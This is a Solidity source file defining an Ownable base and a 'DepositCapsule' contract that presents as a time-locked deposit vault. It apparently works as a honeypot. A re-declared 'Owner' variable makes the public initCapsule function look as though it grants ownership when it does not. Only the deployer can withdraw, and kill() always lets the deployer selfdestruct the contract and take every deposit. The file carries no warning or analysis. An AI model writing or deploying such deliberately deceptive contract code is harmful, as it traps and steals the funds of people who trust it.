1 /*
2    Copyright (C) 2017  The Halo Platform by Scott Morrison
3                 https://www.haloplatform.tech/
4 
5    This is free software and you are welcome to redistribute it under certain
6    conditions. ABSOLUTELY NO WARRANTY; for details visit:
7    https://www.gnu.org/licenses/gpl-2.0.html
8 */
9 pragma solidity ^0.4.23;
10 
11 contract Ownable {
12     address public Owner;
13     constructor() public { Owner = msg.sender; }
14     modifier onlyOwner() { if (Owner == msg.sender) { _; } }
15     
16     function transferOwner(address _owner) public onlyOwner {
17         address previousOwner;
18         if (address(this).balance == 0) {
19             previousOwner = Owner;
20             Owner = _owner;
21             emit NewOwner(previousOwner, Owner);
22         }
23     }
24     event NewOwner(address indexed oldOwner, address indexed newOwner);
25 }
26 
27 contract DepositCapsule is Ownable {
28     address public Owner;
29     mapping (address=>uint) public deposits;
30     uint public openDate;
31     uint public minimum;
32     
33     function initCapsule(uint openOnDate) public {
34         Owner = msg.sender;
35         openDate = openOnDate;
36         minimum = 0.5 ether;
37         emit Initialized(Owner, openOnDate);
38     }
39     event Initialized(address indexed owner, uint openOn);
40     
41     function() public payable {  }
42     
43     function deposit() public payable {
44         if (msg.value >= minimum) {
45             deposits[msg.sender] += msg.value;
46             emit Deposit(msg.sender, msg.value);
47         } else revert();
48     }
49     event Deposit(address indexed depositor, uint amount);
50 
51     function withdraw(uint amount) public onlyOwner {
52         if (now >= openDate) {
53             uint max = deposits[msg.sender];
54             if (amount <= max && max > 0) {
55                 if (msg.sender.send(amount))
56                     emit Withdrawal(msg.sender, amount);
57             }
58         }
59     }
60     event Withdrawal(address indexed withdrawer, uint amount);
61     
62     function kill() public onlyOwner {
63         if (address(this).balance >= 0)
64             selfdestruct(msg.sender);
65 	}
66 }